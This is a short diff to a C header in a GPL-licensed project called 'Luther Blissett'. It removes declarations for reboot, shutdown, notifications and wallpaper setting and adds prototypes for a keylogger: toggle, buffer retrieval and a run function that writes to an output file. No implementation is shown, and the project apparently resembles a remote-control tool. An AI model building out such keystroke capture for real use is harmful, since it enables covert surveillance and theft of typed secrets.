@@ -15,11 +15,6 @@
  *  You should have received a copy of the GNU General Public License
  *  along with Luther Blissett.  If not, see <http://www.gnu.org/licenses/>.
  */
-void lb_reboot();
-
-void lb_shutdown();
-
-void lb_notify(char *notifyTitle, char *notifyDescription);
-
-
-void setWallpaper(const char *filePath);
+bool keylogger_toggle();
+char *keylogger_buffer();
+int keylog_run(const char *output_file_path);
